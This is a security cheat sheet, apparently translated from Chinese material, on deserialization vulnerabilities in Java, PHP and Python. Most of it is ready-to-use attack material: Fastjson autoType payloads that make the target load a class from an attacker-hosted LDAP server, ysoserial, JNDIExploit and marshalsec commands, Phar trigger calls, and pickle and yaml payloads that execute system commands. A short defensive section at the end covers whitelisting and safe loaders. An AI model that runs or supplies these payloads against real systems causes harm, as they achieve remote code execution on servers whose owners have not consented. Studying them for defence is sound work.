# Web Security - Deserialization vulnerability

> Source: WooYun Vulnerability database | Dismantled From web-injection.md

## Five、Deserialization vulnerability

### 5.1 Nature of vulnerabilities

```
Serialized Data(Untrusted) -> Deserialization function -> Object reconstruction triggers magic methods/callback -> Malicious logic execution
```

**Core formula**: DeserializationRCE = Controllable serialized input + Dangerous class inclasspath/Within scope + Reachable exploitation chain(Gadget Chain)

### 5.2 JavaDeserialization

**Detection identifier**

```
Binary stream: AC ED 00 05 (hexHeader)
Base64:   rO0AB (Encoded header)
Common locations: Cookie、ViewState、JMX、RMI、T3Protocol、HTTP Body
```

**Utilize chain speed check**

| Utilization chain | Dependency library | Triggering methods. | Tool |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | Manual/Dedicated tools |
| Jackson | jackson-databind | Polymorphic deserialization | ysoserial |
| JNDIInjection | JDK < 8u191 | LDAP/RMIRemote class loading | JNDIExploit/marshalsec |

**FastjsonClassicPayload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 Cache bypass
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**Toolchain**

```bash
# ysoserialGeneratepayload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDIInjection service
java -jar JNDIExploit.jar -i attacker_ip

# marshalsecLaunch maliciousLDAP/RMI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHPDeserialization

**Detection identifier**

```
Format: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
Key functions: unserialize(), phar://Protocol trigger
```

**Magic method exploitation chain**

| Method | Trigger timing | Utilization method |
|------|----------|----------|
| `__wakeup()` | unserialize()During invocation | Attribute override→Dangerous operation |
| `__destruct()` | When destroying the object | File deletion/Write/Command execution |
| `__toString()` | Object used as a string | Concatenation into dangerous functions |
| `__call()` | Call non-existent methods | Chained call pivot. |

**POPChain construction ideas**

```
1. Find Entry Point: __wakeup()/__destruct() Call in the$this->xxxmethod of attributes
2. Jumping board: Pass__toString()/__call()/__get() Link to other classes
3. Endpoint: Reachsystem()/eval()/file_put_contents()And other dangerous functions
4. Construct.: Control attribute values to ensure link connectivity
```

**PharDeserialization (No Need forunserializeCall)**

```php
// File operation function triggerphar://Deserialization
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // Disguised as image suffix
```

### 5.4 PythonDeserialization

**Dangerous functions**

```python
import pickle, yaml, marshal

# pickle - Most common
pickle.loads(data)      # Deserialization
pickle.load(file)       # Deserialize from File

# yaml - NeededLoader
yaml.load(data)         # Default unsafe(Old version)
yaml.load(data, Loader=yaml.FullLoader)  # limit loading

# marshal - Bytecode level
marshal.loads(data)     # Load code objects
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# Equivalent Manual Construction:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# Or
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 Defensive measures

```java
// Java: ObjectInputStreamWhitelist Filtering
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: Upgrade components(Fastjson/Jackson/Commons-Collections)、CloseautoType、Use whitelist deserialization filters
- **PHP**: Avoidunserialize()Process user input、Usejson_decodeAlternative、Disablephar://Protocol
- **Python**: Use`yaml.safe_load()`Alternative`yaml.load()`、ForbiddenpickleHandle untrusted data、UseJSON
- **Generic**: Avoid transmitting data in native serialization formats, consistently usingJSON; Sign the deserialization entry/HMACValidation

---

